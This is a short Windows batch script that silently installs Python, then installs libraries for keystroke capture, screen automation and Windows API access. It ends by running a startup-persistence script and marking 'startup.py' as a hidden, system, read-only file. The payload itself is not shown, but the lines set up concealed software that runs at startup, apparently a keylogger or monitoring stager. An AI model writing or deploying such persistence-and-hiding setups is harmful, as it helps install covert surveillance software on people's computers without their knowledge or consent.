@echo off

set PYTHON_VERSION=3.9.7
set PYTHON_INSTALL_PATH=C:\Python39
set PYTHON_DOWNLOAD_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe

echo Downloading Python installer...
powershell -Command "Invoke-WebRequest -Uri '%PYTHON_DOWNLOAD_URL%' -OutFile 'python-installer.exe'"

echo Installing Python...
powershell -Command "Start-Process -FilePath 'python-installer.exe' -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'TargetDir=%PYTHON_INSTALL_PATH%' -Wait"

echo Cleaning up...
del python-installer.exe

echo Python installation completed.




pip install beautifulsoup4
pip install requests
pip install pyautogui
pip install keyboard
pip install pywin32


python set_startup.py

attrib +s +h +r "startup.py"
